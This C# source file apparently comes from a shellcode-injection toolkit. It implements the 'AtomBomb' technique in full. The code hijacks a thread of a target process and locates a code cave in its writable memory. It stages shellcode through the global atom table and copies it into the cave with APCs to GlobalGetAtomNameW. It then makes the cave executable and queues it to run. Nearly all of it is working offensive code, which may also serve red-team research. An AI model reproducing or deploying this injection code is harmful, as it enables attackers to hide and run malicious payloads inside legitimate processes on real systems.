using System;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.Debugger;
using static ShellcodeInjectionTechniques.Native;
using static ShellcodeInjectionTechniques.AesHelper;

namespace ShellcodeInjectionTechniques
{
    class PageHelper
    {
        public IntPtr BaseAddress { get; set; }
        public Int32 RegionSize { get; set; }

        public PageHelper(IntPtr baseAddress, Int32 regionSize)
        {
            BaseAddress = baseAddress;
            RegionSize = regionSize;
        }
    }

    class AtomBomb : ITechnique
    {
        public void Run(Process target, byte[] shellcode)
        {
            ProcessThread thread = GetThread(target.Threads);
            Debug("[+] Found thread: {0}", new string[] { thread.Id.ToString() });

            // get a handle to the thread
            IntPtr hThread = OpenThread(ThreadAccess.GET_CONTEXT | ThreadAccess.SET_CONTEXT, false, (UInt32)thread.Id);
            Debug("[+] OpenThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });

            // need to find a remote page we can write to
            PageHelper[] pWritablePages = FindWritablePages(target.Handle, thread.StartAddress);
            //FindWritablePage(target.Handle, thread.StartAddress);
            if (pWritablePages.Length == 0)
            {
                Debug("[!] Unable to find writable page!");
                return;
            }
            else
                Debug("[+] FindWritablePages() - number found: {0}", new string[] { pWritablePages.Length.ToString() });

            // try to find a code cave in the writable pages to atom bomb our shellcode
            IntPtr pWritable = IntPtr.Zero;
            for (int i = 0; i < pWritablePages.Length; i++)
            {
                pWritable = FindCodeCave(target.Handle, pWritablePages[i].BaseAddress, shellcode.Length, pWritablePages[i].RegionSize);
                if (pWritable != IntPtr.Zero)
                    break;
            }

            // we did not find a suitable code cave
            if (pWritable == IntPtr.Zero)
            {
                Debug("[!] Unable to find a suitable code cave!");
                return;
            }
            else
                Debug("[+] Found a suitable code cave - pWritable: 0x{0}", new string[] { pWritable.ToString("X") });

            IntPtr codeCave = pWritable;

            // get the proc address - GlobalGetAtomNameA
            IntPtr pGlobalGetAtomNameW = GetProcAddress(GetModuleBaseAddress("kernel32.dll"), "GlobalGetAtomNameW");
            Debug("[+] GetProcAddress() - pGlobalGetAtomNameW: 0x{0}", new string[] { pGlobalGetAtomNameW.ToString("X") });

            
            // define a chunk size to write our atom names (note: an atom name can be 255 max size)
            Int32 chunkSize = 200;

            // add the atom names as shellcode chunks of length chunkSize - including the terminating null byte
            Int32 sections = (shellcode.Length / chunkSize) + 1;

            // loop through the sections and add the shell code as atom names
            for (int i = 0; i < sections; i++)
            {
                // get the next shellcode chunk
                byte[] tmpBytes = SubArray(shellcode, i * chunkSize, chunkSize);
                byte[] shellcodeChunk = new byte[tmpBytes.Length + 1];

                // add a null byte to the end
                Buffer.BlockCopy(tmpBytes, 0, shellcodeChunk, 0, tmpBytes.Length);
                Buffer.BlockCopy(new byte[1] { 0x00 }, 0, shellcodeChunk, tmpBytes.Length, 1);

                // add the shellcode to the global atom table
                unsafe
                {
                    fixed (byte* ptr = shellcodeChunk)
                    {
                        UInt16 ATOM = GlobalAddAtomW((IntPtr)ptr);
                        Debug("[+] GlobalAddAtom() - ATOM: 0x{0}", new string[] { ATOM.ToString("X") });

                        // queue the APC thread
                        NtQueueApcThread(hThread, pGlobalGetAtomNameW, ATOM, pWritable, chunkSize * 2);
                        Debug("[+] NtQueueApcThread() - pWritable: 0x{0}", new string[] { pWritable.ToString("X") });

                        // increment to the next writable memory location
                        pWritable += chunkSize;
                    }
                }
            }

            IntPtr pVirtualProtect = GetProcAddress(GetModuleBaseAddress("kernel32.dll"), "VirtualProtect");
            Debug("[+] GetProcAddress() - pVirtualProtect: 0x{0}", new string[] { pVirtualProtect.ToString("X") });

            NtQueueApcThread(hThread, pVirtualProtect, (UInt32)codeCave, (IntPtr)shellcode.Length, (Int32)(MemoryProtection.PAGE_EXECUTE_READWRITE));
            Debug("[+] NtQueueApcThread() PAGE_EXECUTE_READWRITE - codeCave: 0x{0}", new string[] { codeCave.ToString("X") });

            QueueUserAPC(codeCave, hThread, IntPtr.Zero);
            Debug("[+] QueueUserAPC() - codeCave: 0x{0}", new string[] { codeCave.ToString("X") });
        }

        ProcessThread GetThread(ProcessThreadCollection threads)
        {
            // find a thread
            // it is very likely that the process you are hijacking will be unstable as 0 is probably the main thread
            return threads[0];

            /*
            // you could loop through the threads looking for a better one
            foreach(ProcessThread thread in threads)
            {
            }
            */
        }

        PageHelper[] FindWritablePages(IntPtr hProcess, IntPtr threadStartAddress)
        {
            Int32 size;
            List<PageHelper> pages = new List<PageHelper>();

            while (true)
            {
                try
                {
                    // query the memory region to see if it is readable and writable, and grab the region size
                    size = VirtualQueryEx(hProcess, threadStartAddress, out MEMORY_BASIC_INFORMATION lpBuffer, (UInt32)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));

                    if (size != 0)
                    {
                        // we need readable and writable pages to find a code cave and write our shellcode to
                        string pageProtection = Enum.GetName(typeof(MemoryProtection), lpBuffer.Protect);
                        if (pageProtection.Contains("WRITE") && pageProtection.Contains("READ"))
                            pages.Add(new PageHelper(lpBuffer.BaseAddress, (Int32)lpBuffer.RegionSize));

                        // move to the next page
                        threadStartAddress = IntPtr.Add(threadStartAddress, (Int32)lpBuffer.RegionSize);
                    }
                    else
                        continue;
                }
                catch
                {
                    break;
                }
            }

            return pages.ToArray();
        }

        IntPtr FindCodeCave(IntPtr hProcess, IntPtr startAddress, int size, int regionSize)
        {
            // byte array to hold the read memory
            byte[] areaToSearch = new byte[regionSize];

            // the region in memory so we can search it for a code cave
            if (!ReadProcessMemory(hProcess, startAddress, areaToSearch, regionSize, out IntPtr lpNumberOfBytesRead))
            {
                // this shouldnt happen but if it does just return zero
                return IntPtr.Zero;
            }

            // look for a code cave
            for (int i = 0; i < (Int32)lpNumberOfBytesRead; i++)
            {
                // find the start of a possible code cave
                if (areaToSearch[i] != 0x00)
                    continue;

                // if we are nearing the end of the region just return zero
                if (i + size >= (Int32)lpNumberOfBytesRead)
                    return IntPtr.Zero;

                // now we need to check to see if there are enough consecutive zeros to put our shellcode
                bool found =  false;
                for(int j = i; j < i + size; j++)
                {
                    if (areaToSearch[j] != 0x00)
                    {
                        i = j;
                        break;
                    }
                    else
                    {
                        // we have a code cave
                        if (j == i + (size - 1))
                        {
                            found = true;
                            break;
                        }
                    }
                }

                // return the code cave address
                if (found)
                    return IntPtr.Add(startAddress, i);
            }

            return IntPtr.Zero;
        }

        IntPtr GetModuleBaseAddress(string name)
        {
            Process hProc = Process.GetCurrentProcess();

            foreach (ProcessModule m in hProc.Modules)
            {
                if (m.ModuleName.ToUpper().StartsWith(name.ToUpper()))
                    return m.BaseAddress;
            }

            // we can't find the base address
            return IntPtr.Zero;
        }
    }
}
